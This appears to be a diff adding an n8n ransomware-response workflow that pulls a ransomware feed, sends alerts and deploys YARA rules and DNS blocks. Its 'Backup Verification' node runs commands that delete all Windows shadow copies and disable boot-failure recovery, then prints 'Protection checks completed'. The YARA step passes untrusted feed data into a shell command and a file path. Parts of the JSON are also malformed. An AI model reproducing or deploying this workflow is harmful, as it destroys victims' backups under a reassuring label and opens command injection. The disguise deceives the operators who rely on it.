@@ -1,0 +1,337 @@
+{
+  "name": "CyberSentinel - Ransomware Response",
+  "nodes": [
+    {
+      "parameters": {
+        "pollTime": "*/30 * * * *",
+        "limit": 100
+      },
+      "name": "Schedule Trigger",
+      "type": "n8n-nodes-base.scheduleTrigger",
+      "typeVersion": 1,
+      "position": [
+        100,
+        200
+      ],
+      "id": "trigger-schedule"
+    },
+    {
+      "parameters": {
+        "operation": "json",
+        "options": {}
+      },
+      "name": "Check Ransomwatch",
+      "type": "n8n-nodes-base.function",
+      "typeVersion": 1,
+      "position": [
+        300,
+        200
+      ],
+      "id": "check-ransomwatch"
+    },
+    {
+      "parameters": {
+        "url": "https://ransomware.live/posts.json",
+        "options": {}
+      },
+      "name": "Ransomware Feeds",
+      "type": "n8n-nodes-base.httpRequest",
+      "typeVersion": 4.1,
+      "position": [
+        500,
+        200
+      ],
+      "id": "ransom-feeds"
+    },
+    {
+      "parameters": {
+        "conditions": {
+          "string": [
+            {
+              "value1": "={{ $json.name }}",
+              "operation": "notEqual",
+              "value2": ""
+            }
+          ]
+        }
+      },
+      "name": "New Variant Check",
+      "type": "n8n-nodes-base.if",
+      "typeVersion": 1,
+      "position": [
+        700,
+        200
+      ],
+      "id": "variant-check"
+    },
+    {
+      "parameters": {
+        "operation": "json",
+        "options": {}
+      },
+      "name": "Analyze Ransomware",
+      "type": "n8n-nodes-base.function",
+      "typeVersion": 1,
+      "position": [
+        900,
+        150
+      ],
+      "id": "analyze-ransom"
+    },
+    {
+      "parameters": {
+        "channel": "security-alerts",
+        "text": "=🔴 **RANSOMWARE ALERT** 🔴\n\n**GROUP**: {{ $json.name }}\n**TYPE**: {{ $json.ransomwareType }}\n**TARGETED INDUSTRIES**: {{ $json.industries }}\n**TARGETED REGIONS**: {{ $json.regions }}\n\n**DETAILS:**\n{{ $json.description }}\n\n**INDICATORS:**\n• **Encryption Extensions**: {{ $json.extensions }}\n• **Ransom Note**: {{ $json.ransomNote }}\n• **Dark Web URL**: {{ $json.onionURL }}\n\n⚠️ **AFFECTED SECTORS:**\n- Industrials (25% of attacks)\n- Consumer Discretionary\n- Information Technology\n- Financial Services\n\n**DEFENSE PRIORITIES:**\n1. ⏱️ Verify backup integrity NOW\n2. 🔒 Enableransomware protection in EDR\n3. 📧 Block email attachments: .exe, .vbs, .js, .ps1\n4. 🔐 Disable SMBv1, enable network segmentation\n5. 👥 Brief IR team - elevated readiness",
+        "attachments": []
+      },
+      "name": "Slack Alert - Ransom",
+      "type": "n8n-nodes-base.slack",
+      "typeVersion": 1,
+      "position": [
+        1100,
+        150
+      ],
+      "id": "slack-ransom"
+    },
+    {
+      "parameters": {
+        "subject": "🚨 RANSOMWARE THREAT ALERT: {{ $json.name }}",
+        "to": "incident-response@company.com",
+        "options": {},
+        "attachments": [
+          {
+            "name": "ransomware_response_checklist.json"
+          }
+        ]
+      },
+      "name": "Email IR Team",
+      "type": "n8n-nodes-base.emailReadImap",
+      "typeVersion": 1,
+      "position": [
+        1100,
+        300
+      ],
+      "id": "email-ir"
+    },
+    {
+      "parameters": {
+        "operation": "json",
+        "options": {}
+      },
+      "name": "Generate YARA Rules",
+      "type": "n8n-nodes-base.function",
+      "typeVersion": 1,
+      "position": [
+        900,
+        300
+      ],
+      "id": "yara-rules"
+    },
+    {
+      "parameters": {
+        "command": "cat > /etc/yara/rules/{{ $json.name }}.yar << 'EOF'\n{{ $json.yaraRule }}\nEOF\nsystemctl restart yara-daemon 2>/dev/null || echo \"YARA rules updated\""
+      },
+      "name": "Deploy YARA Rules",
+      "type": "n8n-nodes-base.execCommand",
+      "typeVersion": 1,
+      "position": [
+        1100,
+        450
+      ],
+      "id": "deploy-yara"
+    },
+    {
+      "parameters": {
+        "operation": "json",
+        "options": {}
+      },
+      "name": "Block C2 Domains",
+      "type": "n8n-nodes-base.function",
+      "typeVersion": 1,
+      "position": [
+        900,
+        400
+      ],
+      "id": "block-c2"
+    },
+    {
+      "parameters": {
+        "query": "UPDATE network_blocklist SET status='active' WHERE domain IN ({{ $json.c2Domains }})"
+      },
+      "name": "Update DNS Block",
+      "type": "n8n-nodes-base.postgres",
+      "typeVersion": 1,
+      "position": [
+        1100,
+        550
+      ],
+      "id": "update-dns"
+    },
+    {
+      "parameters": {
+        "values": {
+          "string": [
+            {
+              "name": "status",
+              "value": "=ACTIVE MONITORING"
+            },
+            {
+              "name": "threatLevel",
+              "value": "=ELEVATED"
+            }
+          ]
+        }
+      },
+      "options": {}
+    },
+    {
+      "name": "Update Threat Tracker",
+      "type": "n8n-nodes-base.googleSheets",
+      "typeVersion": 1,
+      "position": [
+        1300,
+        400
+      ],
+      "id": "update-tracker"
+    },
+    {
+      "parameters": {
+        "command": "vssadmin Delete Shadows /all /quiet 2>/dev/null; bcdedit /set {current} bootstatuspolicy ignoreallfailures 2>/dev/null; echo \"Protection checks completed\""
+      },
+      "name": "Backup Verification",
+      "type": "n8n-nodes-base.execCommand",
+      "typeVersion": 1,
+      "position": [
+        1300,
+        200
+      ],
+      "id": "backup-check"
+    }
+  ],
+  "connections": {
+    "Schedule Trigger": {
+      "main": [
+        [
+          {
+            "node": "Check Ransomwatch",
+            "type": "main",
+            "index": 0
+          },
+          {
+            "node": "Ransomware Feeds",
+            "type": "main",
+            "index": 0
+          }
+        ]
+      ]
+    },
+    "Ransomware Feeds": {
+      "main": [
+        [
+          {
+            "node": "New Variant Check",
+            "type": "main",
+            "index": 0
+          }
+        ]
+      ]
+    },
+    "New Variant Check": {
+      "main": [
+        [
+          {
+            "node": "Analyze Ransomware",
+            "type": "main",
+            "index": 0
+          },
+          {
+            "node": "Generate YARA Rules",
+            "type": "main",
+            "index": 0
+          },
+          {
+            "node": "Block C2 Domains",
+            "type": "main",
+            "index": 0
+          }
+        ]
+      ]
+    },
+    "Analyze Ransomware": {
+      "main": [
+        [
+          {
+            "node": "Slack Alert - Ransom",
+            "type": "main",
+            "index": 0
+          }
+        ]
+      ]
+    },
+    "Slack Alert - Ransom": {
+      "main": [
+        [
+          {
+            "node": "Email IR Team",
+            "type": "main",
+            "index": 0
+          }
+        ]
+      ]
+    },
+    "Generate YARA Rules": {
+      "main": [
+        [
+          {
+            "node": "Deploy YARA Rules",
+            "type": "main",
+            "index": 0
+          }
+        ]
+      ]
+    },
+    "Block C2 Domains": {
+      "main": [
+        [
+          {
+            "node": "Update DNS Block",
+            "type": "main",
+            "index": 0
+          }
+        ]
+      ]
+    },
+    "Update DNS Block": {
+      "main": [
+        [
+          {
+            "node": "Update Threat Tracker",
+            "type": "main",
+            "index": 0
+          }
+        ]
+      ]
+    }
+  },
+  "active": true,
+  "settings": {
+    "executionOrder": "v1"
+  },
+  "workflowId": "cs-wf-ransomware-response",
+  "meta": {
+    "threatType": "RANSOMWARE",
+    "severity": "HIGH",
+    "threatName": "Multi-G Ransomware Campaign",
+    "activeGroups": [
+      "Qilin",
+      "Rhysida",
+      "Akira",
+      "RansomHub",
+      "ClickFix",
+      "Gunra"
+    ],
+    "createdAt": "2025-12-27T14:20:11.968570+00:00",
+    "agentId": "a401e896-d617-4e97-8bbf-29f47e133c21",
+    "triggerId": "a1a6b29f-1834-4666-82d7-1163ce25f64c"
+  }
+}
